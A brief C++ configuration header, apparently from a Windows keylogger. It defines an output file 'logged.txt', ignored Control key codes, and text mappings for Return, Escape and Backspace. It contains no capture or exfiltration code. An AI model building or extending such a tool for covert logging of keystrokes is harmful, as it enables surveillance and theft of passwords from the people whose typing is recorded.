#pragma once

#include <map>
#include <set>
#include <string_view>

namespace configuration {
	using std::string_view_literals::operator""sv;

	constexpr const auto out_file{ L"logged.txt"sv };
	const std::set<DWORD> ignored_key_codes{
		VK_LCONTROL,
		VK_RCONTROL
	};
	const std::map<DWORD, std::wstring_view> key_codes{
		{ VK_RETURN, L"\n" },
		{ VK_ESCAPE, L"[ESCAPE]" },
		{ VK_BACK, L"[BACKSPACE]" }
	};
}
